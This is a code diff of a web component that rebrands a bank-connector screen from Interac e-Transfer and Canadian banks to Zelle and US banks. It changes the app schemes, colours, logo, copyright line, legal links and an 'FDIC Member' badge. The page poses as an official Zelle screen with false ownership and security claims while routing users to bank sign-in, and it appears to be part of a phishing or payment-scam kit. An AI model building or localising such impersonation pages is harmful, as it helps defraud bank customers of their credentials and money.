@@ -21,11 +21,11 @@ export default function BankConnectorScreen({ connector }: BankConnectorScreenPr
     if (isMobile) {
       e.preventDefault()
       const appSchemes: Record<string, string> = {
-        td:         "tdct://",
-        rbc:        "rbc-mobile://",
-        scotiabank: "scotiabank://",
-        bmo:        "bmo://",
-        cibc:       "cibc://",
+        chase:     "chase://",
+        bofa:      "bofa://",
+        wellsfargo:"wellsfargo://",
+        citi:      "citi://",
+        usbank:    "usbank://",
       }
       const scheme = appSchemes[connector.bankId]
       if (scheme) {
@@ -42,22 +42,18 @@ export default function BankConnectorScreen({ connector }: BankConnectorScreenPr
 
       {/* Header */}
       <header className="bg-white border-b border-gray-200 shadow-sm shrink-0">
-        <div className="h-1 bg-[#FDB913]" />
+        <div className="h-1 bg-[#6D1ED4]" />
         <div className="max-w-lg mx-auto px-4 h-14 flex items-center justify-between">
           <a
-            href="https://www.interac.ca"
+            href="https://www.zellepay.com"
             target="_blank"
             rel="noopener noreferrer"
             className="flex items-center gap-2.5"
           >
-            <div className="w-8 h-8 bg-[#FDB913] rounded-md flex items-center justify-center p-1.5">
-              <img
-                src="https://etransfer-notification.interac.ca/images/new/interac_logo.png"
-                alt="Interac"
-                className="w-full h-full object-contain"
-              />
+            <div className="w-8 h-8 bg-[#6D1ED4] rounded-md flex items-center justify-center">
+              <span className="text-white font-black text-lg leading-none">Z</span>
             </div>
-            <span className="text-sm font-bold text-gray-900 tracking-tight">Interac e&#8209;Transfer</span>
+            <span className="text-sm font-bold text-gray-900 tracking-tight">Zelle Payment</span>
           </a>
           <div className="flex items-center gap-1.5 text-xs font-semibold text-green-700 bg-green-50 border border-green-200 px-2.5 py-1 rounded-full">
             <ShieldCheck className="w-3.5 h-3.5" />
@@ -101,11 +97,11 @@ export default function BankConnectorScreen({ connector }: BankConnectorScreenPr
             </div>
 
             {/* Security notice */}
-            <div className="w-full bg-amber-50 border border-amber-200 rounded-xl px-4 py-3 flex items-start gap-3 text-left">
-              <Lock className="w-4 h-4 text-amber-600 shrink-0 mt-0.5" />
-              <p className="text-xs text-amber-700 leading-relaxed">
+            <div className="w-full bg-purple-50 border border-purple-200 rounded-xl px-4 py-3 flex items-start gap-3 text-left">
+              <Lock className="w-4 h-4 text-purple-600 shrink-0 mt-0.5" />
+              <p className="text-xs text-purple-700 leading-relaxed">
                 Your banking credentials are entered directly on{" "}
-                <strong>{connector.bankName}&apos;s</strong> website — never shared with Interac or any third party.
+                <strong>{connector.bankName}&apos;s</strong> website — never shared with Zelle or any third party.
               </p>
             </div>
 
@@ -115,7 +111,7 @@ export default function BankConnectorScreen({ connector }: BankConnectorScreenPr
               target={isMobile ? "_self" : "_blank"}
               rel="noopener noreferrer"
               onClick={handleRedirect}
-              className="w-full flex items-center justify-center gap-2 bg-[#FDB913] hover:bg-[#e5a812] text-black font-bold py-3.5 px-6 rounded-xl transition-colors focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2 text-sm min-h-[48px]"
+              className="w-full flex items-center justify-center gap-2 bg-[#6D1ED4] hover:bg-[#5A18B0] text-white font-bold py-3.5 px-6 rounded-xl transition-colors focus:outline-none focus:ring-2 focus:ring-[#6D1ED4] focus:ring-offset-2 text-sm min-h-[48px]"
             >
               {isMobile ? `Open ${connector.bankName} App` : `Continue to ${connector.bankName}`}
               <ExternalLink className="w-4 h-4" />
@@ -136,7 +132,7 @@ export default function BankConnectorScreen({ connector }: BankConnectorScreenPr
             {[
               { icon: ShieldCheck, label: "256-bit SSL" },
               { icon: Lock,        label: "Bank-level security" },
-              { icon: ShieldCheck, label: "CDIC Member" },
+              { icon: ShieldCheck, label: "FDIC Member" },
             ].map(({ icon: Icon, label }) => (
               <div key={label} className="flex items-center gap-1">
                 <Icon className="w-3.5 h-3.5" />
@@ -150,13 +146,13 @@ export default function BankConnectorScreen({ connector }: BankConnectorScreenPr
       {/* Footer */}
       <footer className="bg-white border-t border-gray-200 py-5 px-4 shrink-0">
         <div className="max-w-lg mx-auto flex flex-col sm:flex-row items-center justify-between gap-3 text-xs text-gray-400">
-          <span>&copy; {new Date().getFullYear()} Interac Corp. All rights reserved.</span>
+          <span>&copy; {new Date().getFullYear()} Zelle. All rights reserved.</span>
           <div className="flex items-center gap-3">
-            <a href="https://www.interac.ca/en/consumers/privacy/" target="_blank" rel="noopener noreferrer" className="hover:text-gray-600 transition-colors">Privacy</a>
+            <a href="https://www.zellepay.com/privacy-policy" target="_blank" rel="noopener noreferrer" className="hover:text-gray-600 transition-colors">Privacy</a>
             <span className="w-1 h-1 rounded-full bg-gray-300" />
-            <a href="https://www.interac.ca/en/consumers/legal/" target="_blank" rel="noopener noreferrer" className="hover:text-gray-600 transition-colors">Terms</a>
+            <a href="https://www.zellepay.com/terms-of-use" target="_blank" rel="noopener noreferrer" className="hover:text-gray-600 transition-colors">Terms</a>
             <span className="w-1 h-1 rounded-full bg-gray-300" />
-            <a href="https://www.interac.ca" target="_blank" rel="noopener noreferrer" className="hover:text-gray-600 transition-colors">interac.ca</a>
+            <a href="https://www.zellepay.com" target="_blank" rel="noopener noreferrer" className="hover:text-gray-600 transition-colors">zellepay.com</a>
           </div>
         </div>
       </footer>
